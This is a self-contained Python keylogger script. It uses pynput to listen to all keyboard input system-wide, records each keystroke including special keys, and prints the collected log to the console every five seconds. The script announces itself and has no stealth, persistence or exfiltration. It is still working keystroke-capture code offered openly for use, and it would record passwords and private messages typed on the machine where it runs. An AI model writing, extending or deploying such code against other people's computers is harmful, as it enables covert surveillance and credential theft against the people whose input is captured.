#!/usr/bin/env python3

import pynput.keyboard
import threading


class KeyLogger:
    """ A simple keylogger that logs keystrokes at a specified time interval. """

    def __init__(self, interval=5):
        """
        Initializes the keylogger.

        :param interval: Time (in seconds) after which logs are printed.
        """
        self.log = ""  # Stores the keystrokes
        self.interval = interval  # Logging interval
        self.listener = None  # Keyboard listener object

    def process_key_press(self, key):
        """
        Callback function to handle key press events.

        :param key: The key pressed.
        """
        try:
            self.log += str(key.char)  # Normal character keys
        except AttributeError:
            # Handling special keys
            if key == pynput.keyboard.Key.space:
                self.log += " "  # Convert space key to a blank space
            else:
                self.log += f" [{str(key)}] "  # Format special keys

    def report(self):
        """
        Logs collected keystrokes at specified intervals.
        """
        if self.log:
            print(f"[LOG] {self.log}")  # Print keystrokes
            self.log = ""  # Reset log after printing

        # Schedule the next report
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True  # Allows graceful exit
        timer.start()

    def start(self):
        """
        Starts the keylogger.
        """
        print(f"[*] Starting keylogger... Logging keystrokes every {self.interval} seconds.")
        try:
            with pynput.keyboard.Listener(on_press=self.process_key_press) as self.listener:
                self.report()  # Start the periodic logging
                self.listener.join()
        except Exception as e:
            print(f"[ERROR] An error occurred: {e}")
        except KeyboardInterrupt:
            print("\n[*] Keylogger stopped by user.")


# Run the keylogger with a user-defined interval
if __name__ == "__main__":
    keylogger = KeyLogger(interval=5)  # Set logging interval to 5 seconds
    keylogger.start()
